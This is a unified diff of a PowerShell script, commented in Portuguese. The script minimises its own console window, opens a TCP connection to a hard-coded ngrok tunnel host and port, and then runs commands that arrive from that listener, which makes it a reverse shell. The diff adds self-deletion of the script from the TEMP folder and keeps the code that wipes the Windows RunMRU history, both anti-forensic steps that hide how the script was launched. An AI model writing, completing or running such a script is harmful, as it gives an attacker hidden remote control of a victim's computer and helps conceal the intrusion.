@@ -11,10 +11,10 @@ public class WinAPI {
 "@
 
 $hwnd = [WinAPI]::GetConsoleWindow()
-[WinAPI]::ShowWindow($hwnd, 2)  # Minimizado
+[WinAPI]::ShowWindow($hwnd, 2)  # 2 = Minimizado
 
 # -----------------------------
-# CONFIGURAÇÕES
+# CONFIGURAÇÕES NGROK
 # -----------------------------
 $ngrokHost = "6.tcp.eu.ngrok.io"
 $ngrokPort = 10577
@@ -24,7 +24,6 @@ $ngrokPort = 10577
 # -----------------------------
 $client = New-Object System.Net.Sockets.TCPClient
 try { $client.Connect($ngrokHost, $ngrokPort) } catch { exit }
-
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
 $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
@@ -39,7 +38,7 @@ while ($true) {
         if ([string]::IsNullOrWhiteSpace($command)) { continue }
 
         if ($command.Trim().ToLower() -eq "exit") {
-            $writer.WriteLine("PowerShell será encerrado pelo listener.")
+            $writer.WriteLine("PowerShell minimizado será encerrado pelo listener.")
             break
         }
 
@@ -52,23 +51,26 @@ while ($true) {
 }
 
 # -----------------------------
+# APAGA O FICHEIRO AO FINAL
+# -----------------------------
+try { Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue } catch {}
+
+# -----------------------------
 # LIMPAR HISTÓRICO RUNMRU
 # -----------------------------
 try {
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name MRUList -ErrorAction SilentlyContinue
     Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" |
-    ForEach-Object {
-        $_.PSObject.Properties |
-        Where-Object { $_.Name -ne '(default)' } |
-        ForEach-Object { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $_.Name -ErrorAction SilentlyContinue }
-    }
+        ForEach-Object {
+            $_.PSObject.Properties |
+            Where-Object { $_.Name -ne '(default)' } |
+            ForEach-Object { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $_.Name -ErrorAction SilentlyContinue }
+        }
 } catch {}
 
 # -----------------------------
-# APAGAR SCRIPT E FECHAR POWERHELL
+# ENCERRA POWERHELL AO DIGITAR exit
 # -----------------------------
-Start-Sleep -Seconds 1
-Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue
 Stop-Process -Id $PID -Force
 
 
